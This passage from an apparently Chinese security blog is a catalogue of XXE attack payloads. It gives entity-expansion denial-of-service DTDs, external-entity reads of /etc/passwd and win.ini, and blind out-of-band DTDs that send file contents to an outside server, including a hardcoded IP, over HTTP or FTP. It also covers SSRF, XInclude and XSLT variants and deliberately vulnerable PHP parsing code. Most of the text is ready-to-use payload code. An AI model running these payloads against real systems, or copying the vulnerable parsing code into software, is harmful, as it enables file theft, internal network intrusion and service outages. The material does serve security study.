&lt;!ENTITY % a1 &quot;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;&quot;&gt;
&lt;!ENTITY % a2 &quot;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;&quot;&gt;
&lt;!ENTITY % a3 &quot;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;&quot;&gt;
&lt;!ENTITY % a4 &quot;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;&quot;&gt;
&lt;!ENTITY g  &quot;%a4;&quot; &gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>XML 二次爆破 DDoS 攻击</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE data [
    &lt;!ENTITY a0 &quot;dosdosdosdosdosdos...dos&quot;&gt;
]&gt;
&lt;data&gt;&amp;a0;&amp;a0;...&amp;a0;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>一般实体递归</p>
<p>最好不要使用递归 — [<a target="_blank" rel="noopener" href="https://www.w3.org/TR/xml11/#norecursion">WFC: No Recursion</a>]</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE data [
    &lt;!ENTITY a &quot;a&amp;b;&quot; &gt;
    &lt;!ENTITY b &quot;&amp;a;&quot; &gt;
]&gt;
&lt;data&gt;&amp;a;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>外部一般实体 (Steuck, 2002)</p>
<p>这种攻击方式是通过申明一个外部一般实体，然后引用位于网上或本地的一个大文件(例如：C:/pagefile.sys 或/dev/random)。</p>
<p>然而，这种攻击只是让解析器解析一个 巨大的 XML 文件而已。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;
&lt;!DOCTYPE data [
    &lt;!ENTITY dos SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;publicServer.com&#x2F;largeFile.xml&quot; &gt;
]&gt;
&lt;data&gt;&amp;dos;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2-基本的-XXE-攻击"><a href="#2-基本的-XXE-攻击" class="headerlink" title="2.基本的 XXE 攻击"></a>2.基本的 XXE 攻击</h2><p>基本的 XXE 攻击 (Steuck, 2002)</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data [
    &lt;!ELEMENT data (#ANY)&gt;
    &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;sys&#x2F;power&#x2F;image_size&quot;&gt;
]&gt;
&lt;data&gt;&amp;file;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们以文件 ‘/sys/power/image_size’ 为例，因为它非常短小只有一行且不包含特殊字符。</p>
<p>这种攻击需要一个直接的反馈通道并且读取文件受到 XML 中禁止字符的限制，如 “&lt;” 和 “&amp;”。</p>
<p>如果这些被禁止的字符出现在要访问的文件中(如：/etc/fstab)，则 XML 解析器会抛出一个错误并停止解析。</p>
<p>使用 netdoc 的 XXE 攻击</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data [
    &lt;!ELEMENT data (#PCDATA)&gt;
    &lt;!ENTITY file SYSTEM &quot;netdoc:&#x2F;sys&#x2F;power&#x2F;image_size&quot;&gt;
]&gt;
&lt;data&gt;&amp;file;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="3-高级的-XXE-攻击-–-直接反馈通道"><a href="#3-高级的-XXE-攻击-–-直接反馈通道" class="headerlink" title="3.高级的 XXE 攻击 – 直接反馈通道"></a>3.高级的 XXE 攻击 – 直接反馈通道</h2><p>这类攻击为高级的 XXE 攻击，用于绕过对基本的 XXE 攻击的限制和 OOB(外带数据) 攻击</p>
<p>绕过基本 XXE 攻击的限制 (Morgan, 2014)</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE data [
    &lt;!ELEMENT data (#ANY)&gt;
    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;
    &lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;sys&#x2F;power&#x2F;image_size&quot;&gt;
    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;
    &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;publicServer.com&#x2F;parameterEntity_core.dtd&quot;&gt;
    %dtd;
]&gt;
&lt;data&gt;&amp;all;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>文件位于：<a target="_blank" rel="noopener" href="http://publicserver.com/parameterEntity_core.dtd">http://publicServer.com/parameterEntity_core.dtd</a></p>
<p><code>&lt;!ENTITY all &#39;%start;%goodies;%end;&#39;&gt;</code></p>
<p>滥用属性值的 XXE 攻击</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE data [
    &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;publicServer.com&#x2F;external_entity_attribute.dtd&quot;&gt;
    %remote;
]&gt;
&lt;data attrib&#x3D;&#39;&amp;internal;&#39;&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>文件位于：<a target="_blank" rel="noopener" href="http://publicserver.com/external_entity_attribute.dtd">http://publicServer.com/external_entity_attribute.dtd</a></p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;sys&#x2F;power&#x2F;image_size&quot;&gt;
&lt;!ENTITY % param1 &quot;&lt;!ENTITY internal &#39;%payload;&#39;&gt;&quot;&gt;
%param1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="4-高级的-XXE-攻击-—-外带数据-OOB-通道"><a href="#4-高级的-XXE-攻击-—-外带数据-OOB-通道" class="headerlink" title="4.高级的 XXE 攻击 — 外带数据(OOB)通道"></a>4.高级的 XXE 攻击 — 外带数据(OOB)通道</h2><p>没有可以直接回传的通道不意味着就不存在 XXE 攻击。</p>
<p>XXE OOB 攻击 (Yunusov, 2013)</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;publicServer.com&#x2F;parameterEntity_oob.dtd&quot;&gt;
&lt;data&gt;&amp;send;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>文件位于：<a target="_blank" rel="noopener" href="http://publicserver.com/parameterEntity_oob.dtd">http://publicServer.com/parameterEntity_oob.dtd</a></p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;sys&#x2F;power&#x2F;image_size&quot;&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;publicServer.com&#x2F;?%file;&#39;&gt;&quot;&gt;
%all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>XXE OOB 攻击 – 参数实体 (Yunusov, 2013)</p>
<p>和前面的攻击很像，区别仅在于只使用参数实体。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data [
    &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;publicServer.com&#x2F;parameterEntity_sendhttp.dtd&quot;&gt;
    %remote;
    %send;
]&gt;
&lt;data&gt;4&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>文件位于：<a target="_blank" rel="noopener" href="http://publicserver.com/parameterEntity_sendhttp.dtd">http://publicServer.com/parameterEntity_sendhttp.dtd</a></p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;sys&#x2F;power&#x2F;image_size&quot;&gt;
&lt;!ENTITY % param1 &quot;&lt;!ENTITY % send SYSTEM &#39;http:&#x2F;&#x2F;publicServer.com&#x2F;%payload;&#39;&gt;&quot;&gt;
%param1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>XXE OOB 攻击 – 参数实体 FTP (Novikov, 2014)</p>
<p>使用 FTP 协议，攻击者可以读取到任意长度的文件。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data [
    &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;publicServer.com&#x2F;parameterEntity_sendftp.dtd&quot;&gt;
    %remote;
    %send;
]&gt;
&lt;data&gt;4&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>文件位于：<a target="_blank" rel="noopener" href="http://publicserver.com/parameterEntity_sendftp.dtd">http://publicServer.com/parameterEntity_sendftp.dtd</a></p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;sys&#x2F;power&#x2F;image_size&quot;&gt;
&lt;!ENTITY % param1 &quot;&lt;!ENTITY % send SYSTEM &#39;ftp:&#x2F;&#x2F;publicServer.com&#x2F;%payload;&#39;&gt;&quot;&gt;
%param1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这种攻击需要配置 FTP 服务器。不过，这个 POC 代码只需要稍作调整即可用于任意的解析器上。</p>
<p>SchemaEntity 攻击 (Späth, 2015)</p>
<p>这里有三种不同的攻击方式：(i) schemaLocation，(ii) noNamespaceSchemaLocation 和 (iii) XInclude。</p>
<p>schemaLocation</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;
&lt;!DOCTYPE data [
    &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;publicServer.com&#x2F;external_entity_attribute.dtd&quot;&gt;
    %remote;
]&gt;
&lt;ttt:data xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;
   xmlns:ttt&#x3D;&quot;http:&#x2F;&#x2F;test.com&#x2F;attack&quot;
 xsi:schemaLocation&#x3D;&quot;ttt http:&#x2F;&#x2F;publicServer.com&#x2F;&amp;internal;&quot;&gt;4&lt;&#x2F;ttt:data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>noNamespaceSchemaLocation</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;
&lt;!DOCTYPE data [
    &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;publicServer.com&#x2F;external_entity_attribute.dtd&quot;&gt;
    %remote;
]&gt;
&lt;data xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;
    xsi:noNamespaceSchemaLocation&#x3D;&quot;http:&#x2F;&#x2F;publicServer.com&#x2F;&amp;internal;&quot;&gt;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>XInclude</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE data [
    &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;publicServer.com&#x2F;external_entity_attribute.dtd&quot;&gt;
    %remote;
]&gt;
&lt;data xmlns:xi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt;&lt;xi:includehref&#x3D;&quot;http:&#x2F;&#x2F;192.168.2.31&#x2F;&amp;internal;&quot; parse&#x3D;&quot;text&quot;&gt;&lt;&#x2F;xi:include&gt;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>文件位于：<a target="_blank" rel="noopener" href="http://publicserver.com/external_entity_attribute.dtd">http://publicServer.com/external_entity_attribute.dtd</a></p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;sys&#x2F;power&#x2F;image_size&quot;&gt;
&lt;!ENTITY % param1 &quot;&lt;!ENTITY internal &#39;%payload;&#39;&gt;&quot;&gt;
%param1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="5-SSRF-攻击"><a href="#5-SSRF-攻击" class="headerlink" title="5.SSRF 攻击"></a>5.SSRF 攻击</h2><p>DOCTYPE</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;publicServer.com&#x2F;&quot; [
    &lt;!ELEMENT data (#ANY)&gt;
]&gt;
&lt;data&gt;4&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>外部一般实体 (Steuck, 2002)</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;
&lt;!DOCTYPE data [
    &lt;!ELEMENT data (#ANY)&gt;
    &lt;!ENTITY remote SYSTEM &quot;http:&#x2F;&#x2F;internalSystem.com&#x2F;file.xml&quot;&gt;
]&gt;
&lt;data&gt;&amp;remote;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>尽管为了不引起错误，最好是引用格式良好的 XML 文件(或者任何文本文件)，但一些解析器可能还是会调用 URL 引用格式有问题的文件。</p>
<p>外部参数实体 (Yunusov, 2013)</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;
&lt;!DOCTYPE data [
    &lt;!ELEMENT data (#ANY)&gt;
    &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;publicServer.com&#x2F;url_invocation_parameterEntity.dtd&quot;&gt;
    %remote;
]&gt;
&lt;data&gt;4&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>文件位于：<a target="_blank" rel="noopener" href="http://publicserver.com/url_invocation_parameterEntity.dtd">http://publicServer.com/url_invocation_parameterEntity.dtd</a></p>
<p><code>&lt;!ELEMENT data2 (#ANY)&gt;</code></p>
<h2 id="6-XInclude"><a href="#6-XInclude" class="headerlink" title="6.XInclude"></a>6.XInclude</h2><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;
&lt;data xmlns:xi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt;
&lt;xi:includehref&#x3D;&quot;http:&#x2F;&#x2F;publicServer.com&#x2F;file.xml&quot;&gt;
&lt;&#x2F;xi:include&gt;
&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>文件位于：<a target="_blank" rel="noopener" href="http://publicserver.com/file.xml">http://publicServer.com/file.xml</a></p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&#39;1.0&#39; encoding&#x3D;&#39;utf-8&#39;?&gt;&lt;data&gt;it_works&lt;&#x2F;data&gt;
schemaLocation
&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;
&lt;ttt:data xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;
   xmlns:ttt&#x3D;&quot;http:&#x2F;&#x2F;test.com&#x2F;attack&quot;
 xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;publicServer.com&#x2F;url_invocation_schemaLocation.xsd&quot;&gt;4&lt;&#x2F;ttt:data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>文件位于：<a target="_blank" rel="noopener" href="http://publicserver.com/url_invocation_schemaLocation.xsd">http://publicServer.com/url_invocation_schemaLocation.xsd</a></p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
&lt;xs:schema
     xmlns:xs&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot;&gt;
 &lt;xs:element name&#x3D;&quot;data&quot; type&#x3D;&quot;xs:string&quot;&#x2F;&gt;
&lt;&#x2F;xs:schema&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或者使用这个文件</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
&lt;xs:schema
     xmlns:xs&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot;
  targetNamespace&#x3D;&quot;http:&#x2F;&#x2F;test.com&#x2F;attack&quot;&gt;
 &lt;xs:element name&#x3D;&quot;data&quot; type&#x3D;&quot;xs:string&quot;&#x2F;&gt;
&lt;&#x2F;xs:schema&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>noNamespaceSchemaLocation</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;
&lt;data xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;
xsi:noNamespaceSchemaLocation&#x3D;&quot;http:&#x2F;&#x2F;publicServer.com&#x2F;url_invocation_noNamespaceSchemaLocation.xsd&quot;&gt;4&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>文件位于：<a target="_blank" rel="noopener" href="http://publicserver.com/url_invocation_noNamespaceSchemaLocation.xsd">http://publicServer.com/url_invocation_noNamespaceSchemaLocation.xsd</a></p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
&lt;xs:schema
     xmlns:xs&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot;&gt;
 &lt;xs:element name&#x3D;&quot;data&quot; type&#x3D;&quot;xs:string&quot;&#x2F;&gt;
&lt;&#x2F;xs:schema&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>XInclude 攻击 (Morgan, 2014)</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;data xmlns:xi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt;
&lt;xi:includehref&#x3D;&quot;&#x2F;sys&#x2F;power&#x2F;image_size&quot;&gt;
&lt;&#x2F;xi:include&gt;
&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="7-XSLT-攻击"><a href="#7-XSLT-攻击" class="headerlink" title="7.XSLT 攻击"></a>7.XSLT 攻击</h2><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;xsl:stylesheet version&#x3D;&quot;1.0&quot; xmlns:xsl&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot;&gt;
   &lt;xsl:template match&#x3D;&quot;&#x2F;&quot;&gt;
       &lt;xsl:value-of select&#x3D;&quot;document(&#39;&#x2F;sys&#x2F;power&#x2F;image_size&#39;)&quot;&gt;
   &lt;&#x2F;xsl:value-of&gt;&lt;&#x2F;xsl:template&gt;
&lt;&#x2F;xsl:stylesheet&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>点：libxml2.9.1及以后，默认不解析外部实体。测试的时候window下使用的是php5.2(libxml Version 2.7.7 ), php5.3(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。 </p>
<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="http://vulhub.org/#/environments/php_xxe/">http://vulhub.org/#/environments/php_xxe/</a></p>
<p>有回显有报错测试代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$xml</span><span class="token operator">=</span><span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>无回显无报错测试代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$xml</span><span class="token operator">=</span>@<span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h1 id="XXE注入的几种姿势"><a href="#XXE注入的几种姿势" class="headerlink" title="XXE注入的几种姿势"></a>XXE注入的几种姿势</h1><p>利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用，基本上啥都能做了，一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p>
<h2 id="1-能够直接回显的"><a href="#1-能够直接回显的" class="headerlink" title="1.能够直接回显的"></a>1.能够直接回显的</h2><p>这种能够回显的，直接写一个参数+外部实体然后调用就好了</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE a [
   &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;
&lt;foo&gt;
    &lt;value&gt;&amp;file;&lt;&#x2F;value&gt;
&lt;&#x2F;foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>有回显的情况可以使用如下的两种方式进行XXE注入攻击。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE foo [
    &lt;!ELEMENT foo ANY &gt;
    &lt;!ENTITY  xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot; &gt;
]&gt;
&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;
&lt;!DOCTYPE foo [
    &lt;!ELEMENT foo ANY &gt;
    &lt;!ENTITY  % xxe SYSTEM &quot;http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;evil.dtd&quot; &gt;
    %xxe;
]&gt;
&lt;foo&gt;&amp;evil;&lt;&#x2F;foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>外部evil.dtd中的内容。</p>
<p><code>&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;</code></p>
<p><a target="_blank" rel="noopener" href="http://image.3001.net/images/20171211/1512973900504.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234018770-1055065163.gif" alt="001.png"></a></p>
<p>当然也可以进行内网站点的入侵(属于SSRF的内容 后续补充)。</p>
<p><a target="_blank" rel="noopener" href="http://image.3001.net/images/20171211/15129739223096.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234019593-2127027338.gif" alt="002.png"></a></p>
<h2 id="2-不能直接回显的，Blind-XXE"><a href="#2-不能直接回显的，Blind-XXE" class="headerlink" title="2.不能直接回显的，Blind XXE"></a>2.不能直接回显的，Blind XXE</h2><p>首先在vps中建立evil.dtd</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % all
&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;118.89.16.36&#x2F;x&#x2F;?id&#x3D;%file;&#39;&gt;&quot;
\&gt; 
%all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后xml中书写如下形式</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE ANY [
    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;hosts&quot;&gt;
    &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;118.89.16.36&#x2F;evil.dtd&quot;&gt;
    %dtd;
    %send;
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE updateProfile [
    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;target.php&quot;&gt;
    &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;evil.dtd&quot;&gt;
    %dtd;
    %send;
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % all
“&lt;!ENTITY &amp;#x25; send SYSTEM ‘http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;?data&#x3D;%file;’&gt;”
\&gt;
%all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>有报错直接查看报错信息。</p>
<p><a target="_blank" rel="noopener" href="http://image.3001.net/images/20171211/15129740453963.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234020052-1087958443.gif" alt="baocuo.png"></a></p>
